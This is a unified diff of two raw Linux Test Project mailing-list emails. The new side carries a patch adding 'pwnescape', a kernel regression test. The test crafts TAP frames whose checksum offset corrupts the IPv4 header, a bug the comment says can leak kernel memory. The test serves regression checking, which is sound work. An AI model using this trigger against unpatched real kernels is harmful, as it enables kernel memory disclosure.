@@ -1,111 +1,119 @@
 Received: from picard.linux.it (picard.linux.it [213.254.12.146])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature ECDSA (prime256v1))
+	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 975D6606A33C
-	for <ltp@archiver.kernel.org>; Tue, 20 Oct 2026 13:05:09 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1DB9D606A31C
+	for <ltp@archiver.kernel.org>; Tue, 20 Oct 2026 14:00:43 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=fail reason="signature verification failed" (1024-bit key, unprotected) header.d=suse.cz header.i=@suse.cz header.a=rsa-sha256 header.s=susede2_rsa header.b=tcUxUouj;
-	dkim=fail reason="signature verification failed" header.d=suse.cz header.i=@suse.cz header.a=ed25519-sha256 header.s=susede2_ed25519 header.b=jhotqYJU;
-	dkim=fail reason="signature verification failed" (1024-bit key) header.d=suse.cz header.i=@suse.cz header.a=rsa-sha256 header.s=susede2_rsa header.b=3I6QIj6z;
-	dkim=neutral header.d=suse.cz header.i=@suse.cz header.a=ed25519-sha256 header.s=susede2_ed25519 header.b=orvqjCl/
+	dkim=fail reason="signature verification failed" (1024-bit key, unprotected) header.d=suse.de header.i=@suse.de header.a=rsa-sha256 header.s=susede2_rsa header.b=F9YnsaI+;
+	dkim=fail reason="signature verification failed" header.d=suse.de header.i=@suse.de header.a=ed25519-sha256 header.s=susede2_ed25519 header.b=oTCvOXvz;
+	dkim=fail reason="signature verification failed" (1024-bit key) header.d=suse.de header.i=@suse.de header.a=rsa-sha256 header.s=susede2_rsa header.b=F9YnsaI+;
+	dkim=neutral header.d=suse.de header.i=@suse.de header.a=ed25519-sha256 header.s=susede2_ed25519 header.b=oTCvOXvz
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id 3A3E63EA636
-	for <ltp@archiver.kernel.org>; Tue, 20 Oct 2026 15:05:08 +0200 (CEST)
-Received: from in-7.smtp.seeweb.it (in-7.smtp.seeweb.it [217.194.8.7])
+	by picard.linux.it (Postfix) with ESMTP id 9D96B3EA673
+	for <ltp@archiver.kernel.org>; Tue, 20 Oct 2026 16:00:41 +0200 (CEST)
+Received: from in-6.smtp.seeweb.it (in-6.smtp.seeweb.it
+ [IPv6:2001:4b78:1:20::6])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature ECDSA (secp384r1))
  (No client certificate requested)
- by picard.linux.it (Postfix) with ESMTPS id 6AEA93EA623
- for <ltp@lists.linux.it>; Tue, 20 Oct 2026 15:04:53 +0200 (CEST)
-Received: from smtp-out2.suse.de (smtp-out2.suse.de
- [IPv6:2a07:de40:b251:101:10:150:64:2])
+ by picard.linux.it (Postfix) with ESMTPS id BD2AA3E2AAC
+ for <ltp@lists.linux.it>; Tue, 20 Oct 2026 16:00:23 +0200 (CEST)
+Received: from smtp-out1.suse.de (smtp-out1.suse.de
+ [IPv6:2a07:de40:b251:101:10:150:64:1])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
  (No client certificate requested)
- by in-7.smtp.seeweb.it (Postfix) with ESMTPS id 072A2200928
- for <ltp@lists.linux.it>; Tue, 20 Oct 2026 15:04:52 +0200 (CEST)
+ by in-6.smtp.seeweb.it (Postfix) with ESMTPS id 12F651400324
+ for <ltp@lists.linux.it>; Tue, 20 Oct 2026 16:00:22 +0200 (CEST)
 Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
  (No client certificate requested)
- by smtp-out2.suse.de (Postfix) with ESMTPS id B90341F7C7;
- Tue, 20 Oct 2026 13:04:50 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
- t=1792501492; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+ by smtp-out1.suse.de (Postfix) with ESMTPS id 7A41621DD0;
+ Tue, 20 Oct 2026 14:00:21 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+ t=1792504821; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
- in-reply-to:in-reply-to:references:references;
- bh=+qEjuQevZqyO6CweEJ3yMgcImI5q9b4HueNFxukrWBY=;
- b=tcUxUoujeUBIZIAoZeJn5knoqGMa7rqs1fNlX/hZ0EwgD0Ea+QTTdPuV02/AgoWiJsA276
- eRYxKuMFSSQagvR6aHIIdANfBTRacyjI1+tz3JquFvLGpnjZdA+xfOUlJjyU2puPCiGfpO
- LXxyKtjUFE7Buk7zvMIMosAfahI05OQ=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
- s=susede2_ed25519; t=1792501492;
+ content-transfer-encoding:content-transfer-encoding;
+ bh=GJ0bS9UMOGlC4ANpwTprBa+QxmO+hgSA9QosyurJ8Xg=;
+ b=F9YnsaI+IQnwEORntymG4x3ZoH5AgizRF4Uy6vR0dz1f6KaniHQ7mbnpXB6NGrCHEGo/AO
+ Opvv72AfouJaloqYdqFelQwuqlB2/VF76Wea9h8b7R9tFeXIqiQqlmOGt9fRhJ7A05XIrE
+ hC+b8XDe97beqN3TB1MS01JlRKIyIWE=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+ s=susede2_ed25519; t=1792504821;
  h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
- in-reply-to:in-reply-to:references:references;
- bh=+qEjuQevZqyO6CweEJ3yMgcImI5q9b4HueNFxukrWBY=;
- b=jhotqYJUYAhtrZ3865uZhFMpaHuRrUS44qWUwEsgcdd1gvBXSPJS/4r5ewZZhB8KS0vTqx
- xKZR0tNpR4xqibCQ==
-Authentication-Results: smtp-out2.suse.de;
+ content-transfer-encoding:content-transfer-encoding;
+ bh=GJ0bS9UMOGlC4ANpwTprBa+QxmO+hgSA9QosyurJ8Xg=;
+ b=oTCvOXvzSt19Ma+/+nR/4VKFskydyeZKDxZJnCtPegquOR+tOU2v041S6LVQwzlRzYY4Qz
+ 1/wkzugumjfg3NDA==
+Authentication-Results: smtp-out1.suse.de;
 	none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
- t=1792501490; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+ t=1792504821; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
- in-reply-to:in-reply-to:references:references;
- bh=+qEjuQevZqyO6CweEJ3yMgcImI5q9b4HueNFxukrWBY=;
- b=3I6QIj6z3yVQ0iFqkOoAG9KhVQfUQj4GhImtYuXpJVWJpdS9k+eR+FqqhBAXRqhjbaHvC+
- EDD/4LI2HhVYWtgprZYyH4ViNz8pkja3kxGkV8metOvxTR339FDopqyJbhbNvm0kuEe4j+
- sktu8wi9ij2A7VXU96W1/aN5hSGuCW0=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
- s=susede2_ed25519; t=1792501490;
+ content-transfer-encoding:content-transfer-encoding;
+ bh=GJ0bS9UMOGlC4ANpwTprBa+QxmO+hgSA9QosyurJ8Xg=;
+ b=F9YnsaI+IQnwEORntymG4x3ZoH5AgizRF4Uy6vR0dz1f6KaniHQ7mbnpXB6NGrCHEGo/AO
+ Opvv72AfouJaloqYdqFelQwuqlB2/VF76Wea9h8b7R9tFeXIqiQqlmOGt9fRhJ7A05XIrE
+ hC+b8XDe97beqN3TB1MS01JlRKIyIWE=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+ s=susede2_ed25519; t=1792504821;
  h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
- in-reply-to:in-reply-to:references:references;
- bh=+qEjuQevZqyO6CweEJ3yMgcImI5q9b4HueNFxukrWBY=;
- b=orvqjCl/G9dvfrwfmj26NaWVOWSnvAOyjNhjjUlUO6TkkkCnWq5t7OhpkwLYPhcQeupTjg
- j0koHuqJ6v2MHYBQ==
+ content-transfer-encoding:content-transfer-encoding;
+ bh=GJ0bS9UMOGlC4ANpwTprBa+QxmO+hgSA9QosyurJ8Xg=;
+ b=oTCvOXvzSt19Ma+/+nR/4VKFskydyeZKDxZJnCtPegquOR+tOU2v041S6LVQwzlRzYY4Qz
+ 1/wkzugumjfg3NDA==
 Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
  (No client certificate requested)
- by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 856A7136CC;
- Tue, 20 Oct 2026 13:04:50 +0000 (UTC)
+ by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 43310136C6;
+ Tue, 20 Oct 2026 14:00:21 +0000 (UTC)
 Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
- by imap1.dmz-prg2.suse.org with ESMTPSA id 7lHRGfJm12oyZQAAD6G6ig
- (envelope-from <chrubis@suse.cz>); Tue, 20 Oct 2026 13:04:50 +0000
-Date: Tue, 20 Oct 2026 15:05:02 +0200
-From: Cyril Hrubis <chrubis@suse.cz>
-To: Andrea Cervesato <andrea.cervesato@suse.de>
-Message-ID: <atdm_pAPMqWPmN9x@yuki.lan>
-References: <20261020-fchroot-v5-0-63aa6faff503@suse.com>
- <20261020-fchroot-v5-9-63aa6faff503@suse.com>
+ by imap1.dmz-prg2.suse.org with ESMTPSA id 4+agBvVz12p+IAAAD6G6ig
+ (envelope-from <andrea.cervesato@suse.de>); Tue, 20 Oct 2026 14:00:21 +0000
+From: Andrea Cervesato <andrea.cervesato@suse.de>
+Date: Tue, 20 Oct 2026 15:59:00 +0200
 X-Archived-By: <archiver.kernel.org>
 MIME-Version: 1.0
-Content-Disposition: inline
-In-Reply-To: <20261020-fchroot-v5-9-63aa6faff503@suse.com>
-X-Spam-Score: -8.30
+Message-Id: <20261020-pwnescape-v1-1-99e82e00fa36@suse.com>
+X-B4-Tracking: v=1; b=H4sIAKNz12oC/yXMQQqDMBBG4avIrBvIRLDgVUoXMf7qdBFDplVBv
+ LvRLj94vJ0UWaDUVjtlLKIyxwJ+VBQmH0cY6YvJWdewddakNUKDTzCo/dM37JiHmkqfMgbZ7tf
+ r/bf+ug/C9xrQcZxuxhDObQAAAA==
+X-Change-ID: 20261020-pwnescape-e3a7a61211f3
+To: Linux Test Project <ltp@lists.linux.it>
+X-Mailer: b4 0.16.0
+X-Developer-Signature: v=1; a=ed25519-sha256; t=1792504821; l=12316;
+ i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
+ bh=/ReekqC1U6JUdnQYCPu0mSecPsW7neT35Yso3yOzJGA=;
+ b=QcZp/VmRnJ/EwMUD1FxsAuelrTakzYfI2n02PcjoM8PoRclL4XPp36Tf6hPJM4F3XJ07BS4Kh
+ OkMxaHWVvylC5nZ6hbQQu/ZRslj/sR+oLNMm7/uKdJ9gy7IXLxrOuiB
+X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
+ pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
+X-Spamd-Result: default: False [-4.30 / 50.00]; BAYES_HAM(-3.00)[100.00%];
+ NEURAL_HAM_LONG(-1.00)[-1.000];
+ NEURAL_HAM_SHORT(-0.20)[-0.999]; MIME_GOOD(-0.10)[text/plain];
+ RCPT_COUNT_TWO(0.00)[2]; RCVD_TLS_ALL(0.00)[];
+ RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
+ DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
+ TO_DN_ALL(0.00)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
+ FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+];
+ FROM_EQ_ENVFROM(0.00)[]; RCVD_COUNT_TWO(0.00)[2];
+ DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo,suse.com:email]
+X-Spam-Score: -4.30
 X-Spam-Level: 
-X-Spamd-Result: default: False [-8.30 / 50.00]; REPLY(-4.00)[];
- BAYES_HAM(-3.00)[100.00%]; NEURAL_HAM_LONG(-1.00)[-1.000];
- NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
- TO_MATCH_ENVRCPT_ALL(0.00)[]; TO_DN_ALL(0.00)[];
- DKIM_SIGNED(0.00)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
- ARC_NA(0.00)[]; RCPT_COUNT_TWO(0.00)[2]; FROM_HAS_DN(0.00)[];
- RCVD_TLS_ALL(0.00)[]; MISSING_XM_UA(0.00)[];
- FROM_EQ_ENVFROM(0.00)[]; MIME_TRACE(0.00)[0:+];
- RCVD_COUNT_TWO(0.00)[2]; RCVD_VIA_SMTP_AUTH(0.00)[];
- DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo,suse.cz:email]
-X-Spam-Status: No, score=-8.6 required=3.0 tests=BAYES_00,DKIM_INVALID,
+X-Spam-Status: No, score=-21.6 required=3.0 tests=BAYES_00,DKIM_INVALID,
 	DKIM_SIGNED,HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_CR_TRAILER,
-	MAILING_LIST_MULTI,SPF_HELO_PASS,SPF_PASS autolearn=ham
-	autolearn_force=no version=4.0.1
+	INCLUDES_PATCH,MAILING_LIST_MULTI,MENTIONS_GIT_HOSTING,SPF_HELO_PASS,
+	SPF_PASS,USER_AGENT_GIT autolearn=ham autolearn_force=no version=4.0.1
 X-Spam-Checker-Version: SpamAssassin 4.0.1 (2024-03-26) on
 	aws-us-west-2-korg-listserv-alma10-1
-X-Virus-Scanned: clamav-milter 1.0.9 at in-7.smtp.seeweb.it
+X-Virus-Scanned: clamav-milter 1.0.9 at in-6.smtp.seeweb.it
 X-Virus-Status: Clean
-Subject: Re: [LTP] [PATCH v5 09/14] fchroot08: test failfs root fork
- inheritance
+Subject: [LTP] [PATCH] cve: add pwnescape reproducer
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -115,17 +123,398 @@ List-Post: <mailto:ltp@lists.linux.it>
 List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
 List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
  <mailto:ltp-request@lists.linux.it?subject=subscribe>
-Cc: Linux Test Project <ltp@lists.linux.it>
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
 
-Hi!
-Reviewed-by: Cyril Hrubis <chrubis@suse.cz>
+From: Andrea Cervesato <andrea.cervesato@suse.com>
 
--- 
-Cyril Hrubis
-chrubis@suse.cz
+Verify that IPv4 fragmentation validates csum_start before completing
+partial checksums so bogus virtio_net_hdr checksum offsets cannot
+overwrite the IPv4 header.
+
+Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
+---
+Before 6785011f8b16
+
+	tst_test.c:2061: TINFO: LTP version: 20260930-29-g34e338bbb
+	tst_test.c:2064: TINFO: Tested kernel: 7.3.0-rc5-virtme #18 SMP PREEMPT_DYNAMIC Tue Oct 20 15:48:53 CEST 2026 x86_64
+	tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.3.0-rc5-virtme/build/.config'
+	tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.3.0-rc5-virtme/build/.config'
+	tst_test.c:1895: TINFO: Overall timeout per run is 0h 00m 30s
+	[    1.323287] tun: Universal TUN/TAP device driver, 1.6
+	pwnescape.c:217: TFAIL: IPv4 header IHL corrupted by checksum completion (15)
+
+	HINT: You _MAY_ be missing kernel fixes:
+
+	https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6785011f8b16
+
+After 6785011f8b16
+
+	tst_test.c:2061: TINFO: LTP version: 20260930-29-g34e338bbb
+	tst_test.c:2064: TINFO: Tested kernel: 7.3.0-rc5-virtme #19 SMP PREEMPT_DYNAMIC Tue Oct 20 15:52:44 CEST 2026 x86_64
+	tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.3.0-rc5-virtme/build/.config'
+	tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.3.0-rc5-virtme/build/.config'
+	tst_test.c:1895: TINFO: Overall timeout per run is 0h 00m 30s
+	[    1.305821] tun: Universal TUN/TAP device driver, 1.6
+	[    1.307941] modprobe (198) used greatest stack depth: 11968 bytes left
+	pwnescape.c:223: TPASS: kernel dropped the datagram with checksum metadata inside the IPv4 header
+
+This reproducer has been generated by DeepSeep v4 Pro and tuned up by
+Gemini 4 Argon.
+---
+ runtest/cve               |   1 +
+ testcases/cve/.gitignore  |   1 +
+ testcases/cve/pwnescape.c | 309 ++++++++++++++++++++++++++++++++++++++++++++++
+ 3 files changed, 311 insertions(+)
+
+diff --git a/runtest/cve b/runtest/cve
+index 894863e33..0fe25cd83 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -91,6 +91,7 @@ cve-2023-52879 fanotify25
+ cve-2026-43499 ghostlock
+ cve-2026-53362 setsockopt11
+ cve-2026-64600 refluxfs
++cve-2026-99999 pwnescape
+ # Tests below may cause kernel memory leak
+ cve-2020-25704 perf_event_open03
+ cve-2022-0185 fsconfig03
+diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
+index 418d67566..58246fd2d 100644
+--- a/testcases/cve/.gitignore
++++ b/testcases/cve/.gitignore
+@@ -17,5 +17,6 @@ cve-2025-38236
+ cve-2025-21756
+ cve-2026-46331
+ ghostlock
++pwnescape
+ refluxfs
+ sctphantom
+diff --git a/testcases/cve/pwnescape.c b/testcases/cve/pwnescape.c
+new file mode 100644
+index 000000000..b46a01cc3
+--- /dev/null
++++ b/testcases/cve/pwnescape.c
+@@ -0,0 +1,309 @@
++// SPDX-License-Identifier: GPL-2.0-or-later
++/*
++ * Copyright (C) 2026 Linux Test Project
++ */
++
++/*\
++ * Regression test for commit 6785011f8b16 ("ipv4: validate
++ * checksum_start before completing checksum").
++ *
++ * A frame written to a TAP device can carry a virtio_net_hdr with
++ * VIRTIO_NET_HDR_F_NEEDS_CSUM, asking the stack to complete a partial
++ * checksum later. If csum_start points into the IPv4 header instead of
++ * at the transport header, skb_checksum_help() completes the checksum
++ * and stores the result at csum_start + csum_offset, overwriting the
++ * first two bytes of the IPv4 header that were already parsed. When
++ * such a packet needs to be fragmented, ip_do_fragment() then reads
++ * the corrupted version/IHL byte and copies an attacker-chosen number
++ * of "header" bytes, which can read past skb_headlen() and disclose
++ * adjacent kernel memory in the IPv4 options of the emitted fragments.
++ *
++ * The test loads the tun module when run as root and runs inside a
++ * private network namespace so that it needs no other privileges.
++ *
++ * [Algorithm]
++ *
++ * - create a TAP device with MAC 02:00:00:00:00:01, address
++ *   10.0.0.1/24 and MTU 200 inside a fresh network namespace
++ * - add a permanent neighbour entry for 10.0.0.3 on the TAP device
++ * - enable IPv4 forwarding in the network namespace
++ * - open an AF_PACKET (:manpage:`packet(7)`) socket bound to the TAP
++ *   device
++ * - send a 320 byte control IPv4 datagram behind two VID 0 VLAN tags
++ *   with checksum metadata at the transport header (frame offset 42)
++ *   and verify its fragments are forwarded with an intact header
++ * - send the test datagram with csum_start on the IPv4 header (frame
++ *   offset 22) and a payload word chosen so that completing the bogus
++ *   checksum writes 0x4f (version 4, IHL 15) at the start of the IPv4
++ *   header, then check whether the emitted fragments carry the
++ *   corrupted header
++ */
++
++#include <net/if.h>
++#include <net/if_arp.h>
++#include <linux/if_tun.h>
++#include <linux/virtio_net.h>
++
++#include "tst_test.h"
++#include "tst_module.h"
++#include "tst_netdevice.h"
++#include "tst_timer.h"
++#include "lapi/if_ether.h"
++#include "lapi/if_packet.h"
++#include "lapi/ioctl.h"
++
++#define TAP_NAME	"pwnescape"
++#define TAP_MTU		200
++#define PAYLOAD_LEN	300
++
++#define IP_PROTO	253
++#define TTL		64
++
++#define CTRL_ID		0x2000
++#define TEST_ID		0x3000
++#define GOOD_IHL	5
++#define BAD_FIRST_BYTE	0x4f	/* IPv4, IHL 15 */
++
++struct vlan_tag {
++	uint16_t tci;
++	uint16_t proto;
++} __attribute__((packed));
++
++struct pkt_frame {
++	struct ethhdr eth;
++	struct vlan_tag vlan[2];
++	struct iphdr ip;
++	uint16_t csum_adj;
++	uint8_t payload[PAYLOAD_LEN - sizeof(uint16_t)];
++} __attribute__((packed));
++
++static int tap_fd = -1;
++static int cap_fd = -1;
++
++static struct pkt_frame ctrl_frame;
++static struct pkt_frame test_frame;
++
++static const uint8_t tap_mac[ETH_ALEN] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
++static const uint8_t src_mac[ETH_ALEN] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x02};
++static const uint8_t nbr_mac[ETH_ALEN] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x03};
++
++static uint16_t ip_checksum(const void *buf, size_t len)
++{
++	const uint16_t *w = buf;
++	uint32_t s = 0;
++
++	for (size_t i = 0; i < len / 2; i++)
++		s += w[i];
++
++	s = (s & 0xffff) + (s >> 16);
++	s = (s & 0xffff) + (s >> 16);
++
++	return (uint16_t)~s;
++}
++
++static void build_frame(struct pkt_frame *fr, uint16_t id, int corrupt_iph)
++{
++	memset(fr, 0, sizeof(*fr));
++
++	memcpy(fr->eth.h_dest, tap_mac, ETH_ALEN);
++	memcpy(fr->eth.h_source, src_mac, ETH_ALEN);
++	fr->eth.h_proto = htons(ETH_P_8021Q);
++	fr->vlan[0].proto = htons(ETH_P_8021Q);
++	fr->vlan[1].proto = htons(ETH_P_IP);
++
++	fr->ip.version = 4;
++	fr->ip.ihl = GOOD_IHL;
++	fr->ip.tot_len = htons(sizeof(fr->ip) + PAYLOAD_LEN);
++	fr->ip.id = htons(id);
++	fr->ip.ttl = TTL;
++	fr->ip.protocol = IP_PROTO;
++	fr->ip.saddr = inet_addr("10.0.0.2");
++	fr->ip.daddr = inet_addr("10.0.0.3");
++	fr->ip.check = ip_checksum(&fr->ip, sizeof(fr->ip));
++
++	/* a valid IPv4 header always sums to 0xffff (-0 in one's complement)
++	 * both before and after the forwarding TTL decrement, so with a zero
++	 * payload the folded checksum over the whole IPv4 packet is simply
++	 * ~csum_adj
++	 */
++	if (corrupt_iph)
++		fr->csum_adj = htons(~(uint16_t)(BAD_FIRST_BYTE << 8));
++}
++
++/* write a frame to the TAP device with a virtio_net_hdr that asks
++ * for checksum completion at the given frame-relative csum_start
++ */
++static void send_datagram(struct pkt_frame *fr, uint16_t csum_start)
++{
++	struct virtio_net_hdr vnet_hdr = {
++		.flags = VIRTIO_NET_HDR_F_NEEDS_CSUM,
++		.csum_start = csum_start,
++		.csum_offset = 0,
++	};
++	struct iovec iov[] = {
++		{.iov_base = &vnet_hdr, .iov_len = sizeof(vnet_hdr)},
++		{.iov_base = fr, .iov_len = sizeof(*fr)},
++	};
++
++	SAFE_WRITEV(SAFE_WRITE_ALL, tap_fd, iov, ARRAY_SIZE(iov));
++}
++
++static void drain_capture(void)
++{
++	uint8_t buf[256];
++	ssize_t n;
++
++	do {
++		n = recv(cap_fd, buf, sizeof(buf), MSG_DONTWAIT);
++	} while (n > 0);
++
++	if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK)
++		tst_brk(TBROK | TERRNO, "recv() failed");
++}
++
++/* wait up to two seconds for a fragmented packet with the given IP id;
++ * store its IPv4 IHL in *ihl and return 1
++ */
++static int capture_fragment(uint16_t id, unsigned int *ihl)
++{
++	struct pollfd pfd = {.fd = cap_fd, .events = POLLIN};
++
++	tst_timer_start(CLOCK_MONOTONIC);
++
++	while (!tst_timer_expired_ms(2000)) {
++		struct {
++			struct ethhdr eth;
++			struct iphdr ip;
++		} __attribute__((packed)) hdr;
++		ssize_t n;
++
++		if (SAFE_POLL(&pfd, 1, 100) <= 0)
++			continue;
++
++		n = SAFE_RECV(0, cap_fd, &hdr, sizeof(hdr), 0);
++		if (n < (ssize_t)sizeof(hdr))
++			continue;
++
++		/* a forwarded fragment has MF set or a non-zero fragment
++		 * offset; the injected frame itself never does, which
++		 * distinguishes the forwarded output from its receive-side
++		 * copy on the same device
++		 */
++		if (hdr.eth.h_proto == htons(ETH_P_IP) &&
++		    ntohs(hdr.ip.id) == id &&
++		    ntohs(hdr.ip.frag_off) & (IP_MF | IP_OFFMASK)) {
++			*ihl = hdr.ip.ihl;
++			return 1;
++		}
++	}
++
++	return 0;
++}
++
++static void run(void)
++{
++	unsigned int ihl;
++
++	drain_capture();
++
++	send_datagram(&ctrl_frame, offsetof(struct pkt_frame, csum_adj));
++	if (!capture_fragment(CTRL_ID, &ihl))
++		tst_brk(TBROK, "control datagram was not forwarded back");
++	if (ihl != GOOD_IHL)
++		tst_brk(TBROK, "control datagram IHL corrupted (%u)", ihl);
++
++	send_datagram(&test_frame, offsetof(struct pkt_frame, ip));
++	if (capture_fragment(TEST_ID, &ihl) && ihl != GOOD_IHL) {
++		tst_res(TFAIL,
++			"IPv4 header IHL corrupted by checksum completion (%u)",
++			ihl);
++		return;
++	}
++
++	tst_res(TPASS,
++		"kernel dropped the datagram with checksum metadata inside the IPv4 header");
++}
++
++static void setup(void)
++{
++	struct ifreq ifr;
++	struct sockaddr_ll sll;
++	struct arpreq req;
++
++	if (!geteuid())
++		tst_modprobe("tun", NULL);
++
++	tst_setup_netns();
++
++	/* the tun socket must be opened in the test's own network
++	 * namespace: TUNSETIFF checks for CAP_NET_ADMIN in the user
++	 * namespace that owns the netns the file was opened in
++	 */
++	tap_fd = open("/dev/net/tun", O_RDWR);
++	if (tap_fd < 0)
++		tst_brk(TCONF | TERRNO, "open /dev/net/tun failed");
++
++	memset(&ifr, 0, sizeof(ifr));
++	strncpy(ifr.ifr_name, TAP_NAME, IFNAMSIZ - 1);
++	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_VNET_HDR;
++	SAFE_IOCTL(tap_fd, TUNSETIFF, &ifr);
++
++	NETDEV_SET_HWADDR(TAP_NAME, tap_mac, sizeof(tap_mac));
++	NETDEV_SET_STATE(TAP_NAME, 1);
++	NETDEV_ADD_ADDRESS_INET(TAP_NAME, inet_addr("10.0.0.1"), 24, 0);
++
++	cap_fd = SAFE_SOCKET(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
++
++	memset(&ifr, 0, sizeof(ifr));
++	strncpy(ifr.ifr_name, TAP_NAME, IFNAMSIZ - 1);
++	ifr.ifr_mtu = TAP_MTU;
++	SAFE_IOCTL(cap_fd, SIOCSIFMTU, &ifr);
++
++	memset(&req, 0, sizeof(req));
++	tst_init_sockaddr_inet((struct sockaddr_in *)&req.arp_pa, "10.0.0.3", 0);
++	req.arp_ha.sa_family = ARPHRD_ETHER;
++	memcpy(req.arp_ha.sa_data, nbr_mac, sizeof(nbr_mac));
++	req.arp_flags = ATF_COM | ATF_PERM;
++	strncpy(req.arp_dev, TAP_NAME, IFNAMSIZ - 1);
++	SAFE_IOCTL(cap_fd, SIOCSARP, &req);
++
++	SAFE_FILE_PRINTF("/proc/sys/net/ipv4/ip_forward", "1");
++
++	memset(&sll, 0, sizeof(sll));
++	sll.sll_family = AF_PACKET;
++	sll.sll_protocol = htons(ETH_P_ALL);
++	sll.sll_ifindex = NETDEV_INDEX_BY_NAME(TAP_NAME);
++	SAFE_BIND(cap_fd, (struct sockaddr *)&sll, sizeof(sll));
++
++	build_frame(&ctrl_frame, CTRL_ID, 0);
++	build_frame(&test_frame, TEST_ID, 1);
++}
++
++static void cleanup(void)
++{
++	if (cap_fd != -1)
++		SAFE_CLOSE(cap_fd);
++
++	if (tap_fd != -1)
++		SAFE_CLOSE(tap_fd);
++}
++
++static struct tst_test test = {
++	.test_all = run,
++	.setup = setup,
++	.cleanup = cleanup,
++	.needs_kconfigs = (const char *[]) {
++		"CONFIG_TUN",
++		"CONFIG_USER_NS=y",
++		"CONFIG_NET_NS=y",
++		NULL
++	},
++	.save_restore = (const struct tst_path_val[]) {
++		{PATH_USER_MAX_USER_NAMESPACES, "1024", TST_SR_SKIP},
++		{}
++	},
++	.tags = (const struct tst_tag[]) {
++		{"linux-git", "6785011f8b16"},
++		{}
++	},
++};
+
+---
+base-commit: 2ae4cfe69b9010018f2e5df6fa4bbba21810d4f2
+change-id: 20261020-pwnescape-e3a7a61211f3
+
+Best regards,
+--  
+Andrea Cervesato <andrea.cervesato@suse.com>
+
 
 -- 
 Mailing list info: https://lists.linux.it/listinfo/ltp
